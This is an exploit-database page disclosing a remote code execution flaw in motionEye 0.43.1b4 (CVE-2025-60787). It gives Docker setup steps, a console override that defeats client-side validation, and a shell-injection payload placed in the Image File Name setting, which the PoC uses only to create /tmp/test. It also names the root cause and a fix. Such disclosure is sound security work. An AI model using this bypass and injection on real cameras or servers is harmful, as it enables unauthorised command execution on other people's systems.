---
title: motionEye 0.43.1b4 RCE
url: https://cxsecurity.com/issue/WLB-2026020014
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-14
fetch_date: 2026-02-15T04:14:46.202852
---

# motionEye 0.43.1b4 RCE

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **motionEye 0.43.1b4 RCE** **2026.02.14**  Credit:  **[prabhatverma47](https://cxsecurity.com/author/prabhatverma47/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-60787](https://cxsecurity.com/cveshow/CVE-2025-60787/ "Click to see CVE-2025-60787")**  CWE: **N/A** | |

# Exploit Title: motionEye 0.43.1b4 - RCE
# Exploit PoC: motionEye RCE via client-side validation bypass (safe PoC)
# Filename: motioneye\_rce\_poc\_edb.txt
# Author: prabhatverma47
# Date tested: 2025-05-14 (original test); prepared for submission: 2025-10-11
# Affected Versions: motionEye <= 0.43.1b4
# Tested on: Debian host running Docker; motionEye image ghcr.io/motioneye-project/motioneye:edge
# CVE(s) / References: MITRE/OSV advisories referenced: CVE-2025-60787
#
# Short description:
# Client-side validation in motionEye's web UI can be bypassed via overriding the JS validation
# function. Arbitrary values (including shell interpolation syntax) can be saved into the
# motion config. When motion is restarted, the motion process interprets the config and
# can execute shell syntax embedded inside configuration values such as "image\_file\_name".
#
# Safe PoC: creates a harmless file /tmp/test inside container (non-destructive).
#
# Environment setup:
# 1) Start the motionEye docker image:
# docker run -d --name motioneye -p 9999:8765 ghcr.io/motioneye-project/motioneye:edge
#
# 2) Verify version in logs:
# docker logs motioneye | grep "motionEye server"
# Expect: 0.43.1b4 (or <= 0.43.1b4 for vulnerable)
#
# 3) Access web UI:
# Open http://127.0.0.1:9999
# Login: admin (blank password in default/edge image)
#
# Reproduction (manual + safe PoC):
# A) Bypass client-side validation in browser console:
# 1) Open browser devtools on the dashboard (F12 / Ctrl+Shift+I).
# 2) In the Console tab paste and run:
#
# configUiValid = function() { return true; };
#
# This forces the UI validation function to always return true and allows any value
# to be accepted by the UI forms.
#
# B) Safe payload (paste this into Settings → Still Images → Image File Name and Apply):
# $(touch /tmp/test).%Y-%m-%d-%H-%M-%S
#
# After applying, the PoC triggers creation of /tmp/test inside the motionEye container
# (the "touch" is executed when motion re-reads the config / motionctl restarts).
#
# C) Verify from host:
# docker exec -it motioneye ls -la /tmp | grep test
#
# Expected result:
# /tmp/test exists (created with the permissions of the motion process).
#
# Notes / root cause:
# - UI stores un-sanitized values into camera-\*.conf (e.g., picture\_filename),
# which are later parsed by motion and interpreted as filenames – shell meta is executed.
# - Fix: sanitize/whitelist filename characters (example sanitization provided in README).
#
# References:
# - Original PoC & writeup: https://github.com/prabhatverma47/motionEye-RCE-through-config-parameter
# - motionEye upstream: https://github.com/motioneye-project/motioneye
# - OSV/GHSA advisories referencing this issue (published May–Oct 2025)
# - NVD entries: CVE-2025-60787

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020014)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top